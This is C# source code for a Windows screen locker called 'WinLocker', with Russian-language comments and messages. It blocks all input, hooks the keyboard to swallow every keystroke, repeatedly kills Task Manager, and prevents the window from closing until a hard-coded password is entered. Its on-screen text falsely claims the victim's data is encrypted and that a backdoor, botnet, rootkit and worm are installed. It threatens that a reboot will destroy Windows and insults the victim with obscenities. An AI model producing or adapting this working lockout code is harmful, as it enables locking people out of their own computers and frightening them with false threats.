using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

public class WinLocker : Form
{
    // ============ WinAPI для блокировки ============
    [DllImport("user32.dll")]
    private static extern bool BlockInput(bool fBlockIt);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    private delegate IntPtr KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    // ============ Поля формы ============
    private Label lblTitle;
    private Label lblScaryLeft;
    private Label lblDedsekRight;
    private Label lblPassword;
    private TextBox txtPassword;
    private Label lblStatus;

    private const string PASSWORD = "1601";
    private const int WH_KEYBOARD_LL = 13;
    private IntPtr _hookID = IntPtr.Zero;

    public WinLocker()
    {
        // Настройки окна
        this.WindowState = FormWindowState.Maximized;
        this.FormBorderStyle = FormBorderStyle.None;
        this.TopMost = true;
        this.BackColor = Color.Black;
        this.StartPosition = FormStartPosition.Manual;
        this.Location = new Point(0, 0);
        this.Size = Screen.PrimaryScreen.Bounds.Size;

        // ====== СТРАШНЫЙ ТЕКСТ СЛЕВА ======
        lblScaryLeft = new Label
        {
            Text = "ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ\n" +
                   "ПЕРЕЗАГРУЗКА ИЛИ ВЫКЛЮЧЕНИЕ ПК = СНОС WINDOWS\n" +
                   "ПАРОЛЬ ТЫ НИКОГДА НЕ УЗНАЕШЬ\n" +
                   "СОСИ ХУЙ\n\n" +
                   "НО Я НЕ ВЫМОГАТЕЛЬ, Я ДАМ ТЕБЕ ПАРОЛЬ\n" +
                   "НО НЕ ПРОСТО ПАРОЛЬ, ТЫ ЕГО ДОЛЖЕН РАСШИФРОВАТЬ\n" +
                   "1 - 5 ПАРОЛИ ВСЕ РАЗНЫЕ СЕТИ\n" +
                   "МУЧАЙСЯ ПИДОР\n\n" +
                   "1. standard DES\n$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1\n" +
                   "2. Bcrypt\n$2y$10$XkyocAmlL3rdiz1Uj72MkOpqd.CHCajedThCzis6AL.62OH8lDr/y\n" +
                   "3. SHA1\n24b378e0bfaf950a0b97c7d36f2d65301286dcf6\n" +
                   "4. Base64\nNDM1NjM0MjM0\n" +
                   "5. SHA1\nc93c407d0fb7c60a40b8a2f02b1e4ccf2a9c632d",
            ForeColor = Color.White,
            BackColor = Color.Black,
            Font = new Font("Courier New", 12),
            AutoSize = true,
            Location = new Point(20, 50)
        };
        this.Controls.Add(lblScaryLeft);

        // ====== ТЕКСТ DEDSEK СПРАВА ======
        lblDedsekRight = new Label
        {
            Text = "DeDsEk тебя приветствует\n" +
                   "не надо было ничего скачивать\n" +
                   "из непроверенных источников\n\n" +
                   "DEDSEK тебя видит\n\n" +
                   "кстати это еще не один вирус\n" +
                   "у тебя от меня есть:\n" +
                   "- Бекдор\n" +
                   "- Ботнет\n" +
                   "- Руткит\n" +
                   "- Червяк такой жирный",
            ForeColor = Color.White,
            BackColor = Color.Black,
            Font = new Font("Courier New", 14),
            AutoSize = true,
            Location = new Point(this.Width - 500, 50),
            TextAlign = ContentAlignment.TopRight
        };
        this.Controls.Add(lblDedsekRight);

        // ====== ФОРМА ВВОДА ПАРОЛЯ (по центру внизу) ======
        lblPassword = new Label
        {
            Text = "ВВЕДИТЕ ПАРОЛЬ:",
            ForeColor = Color.White,
            BackColor = Color.Black,
            Font = new Font("Courier New", 24),
            AutoSize = true,
            Location = new Point((this.Width / 2) - 200, (this.Height / 2) + 50)
        };
        this.Controls.Add(lblPassword);

        txtPassword = new TextBox
        {
            PasswordChar = '*',
            Font = new Font("Courier New", 24),
            BackColor = Color.Black,
            ForeColor = Color.White,
            Location = new Point((this.Width / 2) - 200, (this.Height / 2) + 100),
            Size = new Size(400, 40)
        };
        this.Controls.Add(txtPassword);

        lblStatus = new Label
        {
            Text = "",
            ForeColor = Color.White,
            BackColor = Color.Black,
            Font = new Font("Courier New", 16),
            AutoSize = true,
            Location = new Point((this.Width / 2) - 200, (this.Height / 2) + 150)
        };
        this.Controls.Add(lblStatus);

        txtPassword.KeyDown += TxtPassword_KeyDown;

        // Запускаем убийцу Диспетчера задач
        new Thread(KillTaskmgr).Start();
    }

    private void TxtPassword_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Enter)
        {
            if (txtPassword.Text == PASSWORD)
            {
                BlockInput(false);
                Application.Exit();
            }
            else
            {
                lblStatus.Text = "НЕВЕРНЫЙ ПАРОЛЬ!";
                txtPassword.Clear();
            }
        }
    }

    protected override void OnLoad(EventArgs e)
    {
        BlockInput(true);
        SetHook();
        base.OnLoad(e);
    }

    protected override void OnFormClosing(FormClosingEventArgs e)
    {
        e.Cancel = true;
    }

    private void SetHook()
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        return (IntPtr)1; // Блокируем всё
    }

    private static void KillTaskmgr()
    {
        while (true)
        {
            foreach (var proc in Process.GetProcessesByName("taskmgr"))
            {
                try { proc.Kill(); } catch { }
            }
            Thread.Sleep(100);
        }
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [STAThread]
    public static void Main()
    {
        Application.EnableVisualStyles();
        Application.Run(new WinLocker());
    }
}
